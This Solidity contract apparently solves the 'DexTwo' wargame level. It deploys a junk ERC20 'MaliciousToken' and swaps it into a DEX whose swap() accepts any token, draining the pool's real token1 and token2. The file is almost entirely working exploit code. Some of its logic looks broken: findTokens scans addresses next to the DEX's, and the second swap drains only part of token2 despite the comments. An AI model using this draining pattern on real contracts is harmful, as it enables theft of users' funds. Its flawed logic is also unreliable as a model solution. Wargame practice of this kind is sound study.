// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexTwoSolver {
    function findTokens(address dex) external view returns (address[] memory possibleTokens) {
        possibleTokens = new address[](10);
        uint count = 0;
        
        // Check addresses around the DEX
        uint160 dexAddr = uint160(dex);
        
        // Check addresses before and after DEX
        for (uint i = 1; i <= 5; i++) {
            address beforeAddr = address(dexAddr - i);
            address afterAddr = address(dexAddr + i);
            
            // Check if it's a contract
            if (beforeAddr.code.length > 0) {
                possibleTokens[count++] = beforeAddr;
            }
            if (afterAddr.code.length > 0) {
                possibleTokens[count++] = afterAddr;
            }
        }
        
        // Resize array
        assembly {
            mstore(possibleTokens, count)
        }
    }
    
    function solve(address dex) external {
        IDexTwo dexContract = IDexTwo(dex);
        
        // Deploy a malicious token
        MaliciousToken mal = new MaliciousToken();
        
        // The vulnerability: swap() doesn't check if from/to are token1/token2
        // We can use any token address!
        
        // Get initial token addresses (even if they're address(0))
        address token1 = dexContract.token1();
        address token2 = dexContract.token2();
        
        // If tokens are deployed, drain them
        if (token1 != address(0)) {
            // Send 1 token to DEX
            mal.transfer(address(dex), 1);
            
            // Approve DEX
            mal.approve(address(dex), type(uint256).max);
            
            // Swap our token for all of token1
            uint256 dexToken1Balance = IERC20(token1).balanceOf(address(dex));
            if (dexToken1Balance > 0) {
                dexContract.swap(address(mal), token1, 1);
            }
        }
        
        if (token2 != address(0)) {
            // Send more tokens to DEX for the second swap
            mal.transfer(address(dex), 2);
            
            // Swap our token for all of token2
            uint256 dexToken2Balance = IERC20(token2).balanceOf(address(dex));
            if (dexToken2Balance > 0) {
                dexContract.swap(address(mal), token2, 2);
            }
        }
    }
}

contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000);
    }
}